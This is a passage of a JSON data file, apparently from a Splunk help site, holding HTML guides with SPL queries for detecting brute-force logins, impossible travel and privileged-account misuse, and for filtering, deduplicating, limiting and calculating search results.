result=fail*)\n| stats count by user, src_ip\n| sort -count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Works across many log types that use common field names.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Find Patterns</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Failures by source IP</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security action=failure\n| stats count, dc(user) as users_targeted by src_ip\n| sort -count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">IPs with most failures. High user count = possible spray attack.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Failures by user</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security action=failure\n| stats count, dc(src_ip) as source_ips by user\n| sort -count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Users with most failures. Many IPs = possible credential stuffing.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Check for Success After Failure</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security (action=failure OR action=success)\n| stats count(eval(action=\"failure\")) as failures, count(eval(action=\"success\")) as successes by user, src_ip\n| where failures > 5 AND successes > 0</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Users who had failures then succeeded - possible compromised credentials.</p>\n                    </div>\n                </div>\n            "
      },
      {
        "id": "find-brute-force",
        "title": "How to find brute force attacks",
        "description": "Detect repeated failed login attempts that indicate password guessing or credential stuffing.",
        "keywords": "brute force attack failed login password security detection",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to find patterns indicating brute force attacks - many failed logins from one source, or against one account.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Failed Logins Per Source IP</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Find sources with many failures</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security action=failure\n| stats count as failures, dc(user) as targeted_users by src_ip\n| where failures > 10\n| sort - failures</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Sources with >10 failures. High failures + many targeted users = likely attack.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Failed Logins Per User</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Find targeted accounts</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security action=failure\n| stats count as failures, dc(src_ip) as attack_sources by user\n| where failures > 5\n| sort - failures</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Users receiving failed logins. Multiple sources = distributed attack or credential stuffing.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Failure Spikes Over Time</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Visualize attack patterns</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security action=failure\n| timechart span=5m count by src_ip limit=10</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">See when attacks happen and which sources are most active. Spikes indicate active attacks.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Success After Many Failures</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Detect successful brute force</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security\n| stats count(eval(action=\"failure\")) as failures,\n        count(eval(action=\"success\")) as successes by src_ip, user\n| where failures > 5 AND successes > 0\n| sort - failures</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Most critical - successful login after many failures means the attack worked!</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout warning\">\n                    <div class=\"guide-callout-title\">Alert Priority</div>\n                    <p>Many failures = investigate. Failures followed by success = respond immediately. This pattern indicates a compromised account.</p>\n                </div>\n            "
      },
      {
        "id": "find-impossible-travel",
        "title": "How to find impossible travel",
        "description": "Detect when a user logs in from geographically impossible locations in a short time.",
        "keywords": "impossible travel geography location login security anomaly",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to detect when a user authenticates from two locations that are too far apart to travel between in the time elapsed - a strong indicator of credential compromise.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Prerequisites</div>\n                    <div class=\"guide-detail-section\">\n                        <p>This detection requires GeoIP enrichment on your authentication logs. The examples assume you have <code>City</code> or <code>Country</code> fields from iplocation.</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | iplocation src_ip</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">If not already enriched, add iplocation to get City, Country, lat, lon fields.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Find Users in Multiple Countries</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Quick check for multi-country logins</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security action=success\n| iplocation src_ip\n| stats dc(Country) as countries, values(Country) as country_list by user\n| where countries > 1</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Find users logging in from multiple countries. Not always malicious, but worth investigating.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Time-Based Impossible Travel</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Detect rapid location changes</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security action=success\n| iplocation src_ip\n| sort user, _time\n| streamstats current=f last(City) as prev_city, last(_time) as prev_time by user\n| eval time_diff_hours = (_time - prev_time) / 3600\n| where City != prev_city AND time_diff_hours < 2\n| table _time, user, prev_city, City, time_diff_hours, src_ip</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Users who changed cities within 2 hours. Adjust threshold based on your geography.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Known Good Locations</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Exclude expected countries</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security action=success\n| iplocation src_ip\n| search NOT Country IN (\"United States\", \"Canada\", \"United Kingdom\")\n| stats count, values(Country) as countries by user</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Find logins from unexpected countries. Customize the list for your organization.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Consider VPN usage - legitimate users might appear to \"travel\" when connecting through different VPN endpoints. Correlate with VPN logs if available.</p>\n                </div>\n            "
      },
      {
        "id": "privileged-account-usage",
        "title": "How to find privileged account usage",
        "description": "Monitor admin and service account activity for unauthorized use.",
        "keywords": "admin privileged account root service security monitoring",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to monitor how privileged accounts (admin, root, service accounts) are being used and detect potential misuse.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Track All Admin Activity</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Find all admin user events</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security user IN (admin, administrator, root, sa)\n| stats count by user, action, src_ip\n| sort - count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Overview of privileged account usage. Add your known admin accounts to the list.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Pattern-based admin detection</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security (user=*admin* OR user=svc_* OR user=srv*)\n| stats count, values(action) as actions by user, src_ip</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Find accounts matching admin/service naming patterns.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Unusual Admin Behavior</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Admin logins from new sources</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security user=admin action=success\n| stats earliest(_time) as first_seen, latest(_time) as last_seen, count by src_ip\n| where first_seen > relative_time(now(), \"-24h\")\n| convert ctime(first_seen), ctime(last_seen)</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Admin logins from IPs first seen in the last 24 hours - potential compromise.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Off-hours admin activity</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security user IN (admin, administrator)\n| eval hour = strftime(_time, \"%H\")\n| where hour < 6 OR hour > 20\n| stats count by user, src_ip, date_wday</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Admin activity outside business hours (adjust hours for your timezone).</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Service Account Anomalies</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Interactive service account logins</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security user=svc_* LogonType=2\n| stats count by user, src_ip, dest\n| sort - count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Service accounts shouldn't have interactive logins (LogonType 2). This is suspicious.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout warning\">\n                    <div class=\"guide-callout-title\">Alert Priority</div>\n                    <p>Service accounts logging in interactively, or admin accounts from new locations are high-priority alerts. These often indicate credential theft.</p>\n                </div>\n            "
      },
      {
        "id": "baseline-behavior",
        "title": "How to baseline normal behavior",
        "description": "Establish what normal looks like so you can detect anomalies.",
        "keywords": "baseline normal behavior anomaly average statistics",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to understand what \"normal\" looks like in your environment so you can identify when something is abnormal.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Volume Baselines</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Average events per hour</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security earliest=-7d\n| timechart span=1h count\n| stats avg(count) as avg_hourly, stdev(count) as stdev_hourly, max(count) as peak</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Baseline event volume. Anything beyond avg + 2*stdev is unusual.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Per-user activity baseline</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security earliest=-7d\n| stats count by user, date_mday\n| stats avg(count) as avg_daily, stdev(count) as stdev_daily by user</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Each user's normal daily activity level. Compare current day to baseline.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Time-of-Day Patterns</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Activity by hour</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security earliest=-7d\n| eval hour = strftime(_time, \"%H\")\n| stats count by hour\n| sort hour</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">See when activity normally occurs. Activity outside these hours is worth investigating.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Weekend vs weekday</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security earliest=-30d\n| eval is_weekend = if(date_wday=\"saturday\" OR date_wday=\"sunday\", \"weekend\", \"weekday\")\n| stats count by is_weekend\n| eval daily_avg = count / if(is_weekend=\"weekend\", 8, 22)</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Compare weekend to weekday volume. Significant weekend activity might be suspicious.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Detect Anomalies from Baseline</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Find unusual spikes</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security\n| timechart span=1h count\n| eventstats avg(count) as avg_count, stdev(count) as stdev_count\n| eval threshold = avg_count + (2 * stdev_count)\n| where count > threshold\n| eval deviation = round((count - avg_count) / stdev_count, 2)</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Hours where activity exceeds 2 standard deviations from average.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Build baselines from at least 7 days of data (30 days is better). Exclude known anomalies like holidays or maintenance windows when calculating your baseline.</p>\n                </div>\n            "
      }
    ],
    "refining": [
      {
        "id": "filter-results",
        "title": "How to filter out noise",
        "description": "Remove unwanted events from your results using where and NOT.",
        "keywords": "filter exclude remove noise where not ignore skip",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Your search returns too much data. You need to exclude known-good activity, service accounts, or irrelevant events to focus on what matters.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Exclude in the Search</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">NOT keyword</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security action=failure NOT user=svc_*</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Exclude service accounts (starting with svc_).</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Multiple exclusions</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security NOT (user=admin OR user=system OR user=service)</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Exclude multiple known accounts.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Exclude by source</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=network NOT src_ip=10.0.0.* NOT dest_ip=10.0.0.*</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Exclude internal-only traffic.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Filter After Stats (where)</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Only high counts</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | stats count by user | where count > 100</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Only show users with more than 100 events.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Exclude specific values</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | stats count by user | where user!=\"admin\"</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Remove admin from results after counting.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Pattern matching</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | stats count by user | where NOT like(user, \"svc_%\")</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Exclude service accounts using pattern match.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout note\">\n                    <div class=\"guide-callout-title\">NOT vs where</div>\n                    <ul>\n                        <li><strong>NOT</strong> - Filters raw events BEFORE processing. Faster. Use when possible.</li>\n                        <li><strong>where</strong> - Filters AFTER commands like stats. Use for calculated values.</li>\n                    </ul>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Build a list of your environment's \"known good\" - service accounts, monitoring systems, scanner IPs. Create a lookup table to exclude them easily across all searches.</p>\n                </div>\n            "
      },
      {
        "id": "remove-duplicates",
        "title": "How to remove duplicate events",
        "description": "Keep only unique events when you have repeated entries.",
        "keywords": "duplicate dedup unique remove repeated same",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Your search shows the same event multiple times, or you only want to see each unique value once instead of every occurrence.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Using dedup</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">One event per user</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | dedup user</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Keeps only the first event for each unique user.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">One event per user+IP combo</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | dedup user, src_ip</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">One event per unique combination of user and IP.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Keep more than one</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | dedup 3 user</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Keep up to 3 events per user instead of just 1.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Dedup with Sorting</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Dedup keeps the FIRST match. To keep the most recent:</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | sort -_time | dedup user</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Sort newest first, then dedup - keeps most recent per user.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">When to Use What</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><code>dedup</code> - When you want to see actual events, just fewer of them</li>\n                            <li><code>stats dc()</code> - When you just need a count of unique values</li>\n                            <li><code>stats values()</code> - When you want a list of unique values</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Example: Unique Users Per System</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security action=login\n| dedup user, dest\n| stats count by dest\n| sort -count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Count of unique users per destination system.</p>\n                    </div>\n                </div>\n            "
      },
      {
        "id": "choose-fields",
        "title": "How to show only the fields you need",
        "description": "Clean up your output to show just the relevant columns.",
        "keywords": "fields table columns output show hide select",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>Your results have too many columns, or you want to display data in a clean, readable format with just the fields that matter.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Using table</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Select specific fields</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | table _time, user, src_ip, action</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Shows only these four columns in this order.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Include raw event</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | table _time, user, _raw</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Shows time, user, and the full raw event text.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Using fields</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Keep only certain fields</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | fields _time, user, src_ip, action</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Similar to table but keeps event structure for further processing.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Remove specific fields</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | fields - _raw, _indextime, linecount</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Remove these fields, keep everything else.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout note\">\n                    <div class=\"guide-callout-title\">table vs fields</div>\n                    <ul>\n                        <li><code>table</code> - Final output. Converts to table format. Use at the END of your search.</li>\n                        <li><code>fields</code> - Reduces fields but keeps events as events. Use DURING processing to improve performance.</li>\n                    </ul>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Rename Columns</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | table _time, src_ip, user | rename src_ip as \"Source IP\", user as \"Username\"</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Give columns friendlier names for reports.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Add <code>| fields</code> early in long searches to remove fields you don't need. This speeds up processing, especially with <code>_raw</code> which can be large.</p>\n                </div>\n            "
      },
      {
        "id": "limit-results",
        "title": "How to limit the number of results",
        "description": "Show just the first N results, or the top/bottom entries.",
        "keywords": "limit head tail first last top bottom number results",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You have thousands of results but only need to see the first 10, the most recent 50, or the top 5 by count.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">First N Results (head)</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | head 10</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Returns only the first 10 events.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | sort -_time | head 20</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Most recent 20 events (sort by time descending first).</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Last N Results (tail)</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | tail 10</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Returns the last 10 events (oldest if not sorted).</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Top N After Stats</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | stats count by user | sort -count | head 10</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Top 10 users by event count.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <p>Or use the built-in <code>top</code> command:</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | top limit=10 user</code></pre>\n                        </div>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Limit at Search Time</div>\n                    <div class=\"guide-detail-section\">\n                        <p>For faster results when you just need a sample:</p>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security | head 100 | stats count by action</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Stats on just the first 100 events - fast way to explore data structure.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Use <code>head 1000</code> during development to test your search quickly. Remove it when you're ready for full results. Just remember that stats on limited data may not be representative!</p>\n                </div>\n            "
      },
      {
        "id": "boolean-logic",
        "title": "How to use AND, OR, NOT",
        "description": "Combine search conditions with boolean logic to find exactly what you need.",
        "keywords": "and or not boolean logic combine conditions filter",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to combine multiple conditions - find events that match this AND that, this OR that, or everything EXCEPT something.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">AND - All Conditions Must Match</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Implicit AND (just use spaces)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security user=admin action=failure</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Finds events where user is admin AND action is failure. Spaces between conditions mean AND.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Explicit AND</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security user=admin AND action=failure</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Same result. Explicit AND is optional but can improve readability.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">OR - Any Condition Can Match</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Match any of several values</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security (user=admin OR user=root OR user=system)</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Finds events where user is admin OR root OR system. Use parentheses to group OR conditions.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">IN operator (cleaner syntax)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security user IN (admin, root, system)</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Same result, cleaner syntax. Best when checking one field against multiple values.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">NOT - Exclude Matches</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Exclude specific values</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security NOT user=serviceaccount</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">All events EXCEPT those where user is serviceaccount.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Using != (not equal)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security user!=serviceaccount action!=success</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">User is not serviceaccount AND action is not success.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Combining Them</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Complex conditions</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security (action=failure OR action=error) user!=serviceaccount earliest=-1h</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Failed or error events, excluding service accounts, from last hour. Parentheses control grouping.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout warning\">\n                    <div class=\"guide-callout-title\">Watch Out</div>\n                    <p>OR without parentheses can give unexpected results. <code>user=admin OR user=root action=failure</code> means \"admin OR (root AND failure)\" - probably not what you wanted!</p>\n                </div>\n            "
      },
      {
        "id": "eval-basics",
        "title": "How to create calculated fields",
        "description": "Use eval to create new fields, do math, or transform values.",
        "keywords": "eval calculate field create math transform convert",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to create a new field based on existing data - calculate a value, convert units, combine fields, or apply conditional logic.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Basic Calculations</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Convert bytes to megabytes</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | eval size_mb = bytes / 1024 / 1024</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Creates a new field <code>size_mb</code> from the existing <code>bytes</code> field.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Calculate duration</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | eval duration_mins = (end_time - start_time) / 60</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Subtract times and convert seconds to minutes.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Conditional Logic</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">If-then-else</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | eval status = if(code >= 400, \"error\", \"ok\")</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">If code is 400 or higher, status is \"error\", otherwise \"ok\".</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Multiple conditions (case)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | eval severity = case(\n    code >= 500, \"critical\",\n    code >= 400, \"error\",\n    code >= 300, \"warning\",\n    true(), \"ok\"\n)</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Check conditions in order, return first match. <code>true()</code> is the default/else case.</p>\n                    </div>\n                </div>\n\n                <div 